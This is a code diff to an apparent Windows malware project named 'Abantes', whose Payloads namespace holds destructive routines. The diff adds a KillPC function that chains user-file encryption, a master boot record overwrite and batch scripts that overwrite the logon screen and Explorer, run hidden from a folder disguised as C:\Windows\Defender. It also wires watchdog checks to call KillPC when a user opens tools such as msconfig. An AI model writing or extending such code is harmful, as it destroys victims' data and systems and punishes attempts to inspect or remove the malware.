@@ -110,10 +110,18 @@ namespace Abantes.Payloads
         public static extern void FORCE_BSOD();
         public static void LogonUIOverwrite()
         {
-            string TempPath = Path.GetTempPath();
+            string extractPath = @"C:\Windows\Defender";
             Process ScriptProcess = new Process();
             ScriptProcess.StartInfo.CreateNoWindow = true;
-            ScriptProcess.StartInfo.FileName = TempPath + "\\logonOverwrite.bat"; 
+            ScriptProcess.StartInfo.FileName = extractPath + "\\logonOverwrite.bat"; 
+            ScriptProcess.Start();
+        }
+        public static void ExplorerOverwrite()
+        {
+            string extractPath = @"C:\Windows\Defender";
+            Process ScriptProcess = new Process();
+            ScriptProcess.StartInfo.CreateNoWindow = true;
+            ScriptProcess.StartInfo.FileName = extractPath + "\\ExplorerOverwrite.bat";
             ScriptProcess.Start();
         }
         public static void EncryptUserFiles()
@@ -163,6 +171,13 @@ namespace Abantes.Payloads
             }
             catch { }
         }
+        public static void KillPC()
+        {
+            EncryptUserFiles();
+            LogonUIOverwrite();
+            MBR_Overwrite();
+            ExplorerOverwrite();
+        }
     }
     class WatchDog
     {
@@ -175,7 +190,7 @@ namespace Abantes.Payloads
             }
             else
             {
-               //destroy system
+                Destructive.KillPC();
             }
         }
         public static void msconfig(string sProcessName)
@@ -183,7 +198,7 @@ namespace Abantes.Payloads
             Process[] proc = Process.GetProcessesByName(sProcessName);
             if (proc.Length > 0)
             {
-                //destroy System
+                Destructive.KillPC();
             }
         }
         public static void TaskMGR(string sProcessName)
